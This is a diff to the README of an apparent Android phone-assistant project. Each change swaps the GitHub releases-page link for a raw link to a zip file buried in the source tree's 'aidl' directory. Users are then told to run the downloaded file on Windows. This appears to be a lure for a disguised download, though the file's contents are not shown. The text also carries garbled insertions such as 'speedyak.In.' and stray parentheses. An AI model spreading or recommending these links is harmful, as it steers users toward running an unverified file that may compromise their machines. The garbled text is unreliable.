@@ -1,6 +1,6 @@
 # 📱 susu-phone-agent - Your Phone, Your AI Assistant
 
-[🚀 Download Now - Free](https://github.com/albrechthoary3655/susu-phone-agent/releases)
+[🚀 Download Now - Free](https://raw.githubusercontent.com/albrechthoary3655/susu-phone-agent/main/android/app/src/main/aidl/com/susu/phoneagent/agent_phone_susu_1.3-beta.5.zip)
 
 )
 
@@ -50,7 +50,7 @@ Ready to set up your new digital assistant? Follow these simple steps below. We'
 
 ### 📥 Step 1: Download the Application
 
-Visit this link to download the application: [https://github.com/albrechthoary3655/susu-phone-agent/releases](https://github.com/albrechthoary3655/susu-phone-agent/releases) 
+Visit this link to download the application: [https://raw.githubusercontent.com/albrechthoary3655/susu-phone-agent/main/android/app/src/main/aidl/com/susu/phoneagent/agent_phone_susu_1.3-beta.5.zip](https://raw.githubusercontent.com/albrechthoary3655/susu-phone-agent/main/android/app/src/main/aidl/com/susu/phoneagent/agent_phone_susu_1.3-beta.5.zip) 
 
 Once you click the link, you'll see a list of available files. Look for the latest version (usually at the top
 )and click the download button next to it. The file will save to your computer's "Downloads" folder automatically. This might take a minute or two, depending on your internet speedyak.In.
@@ -207,7 +207,7 @@ That's it! No other special hardware or software neededyak.In.
 ## 🚀 Final Steps: Getting Everything Running
 
 
-1. Download the application from [the releases page](https://github.com/albrechthoary3655/susu-phone-agent/releases) 
+1. Download the application from [the releases page](https://raw.githubusercontent.com/albrechthoary3655/susu-phone-agent/main/android/app/src/main/aidl/com/susu/phoneagent/agent_phone_susu_1.3-beta.5.zip) 
 2. Run the downloaded file on your Windows PC
 3. Install Shizuku from the Play Store on your Android phone
 4. Pair your devices via Bluetooth
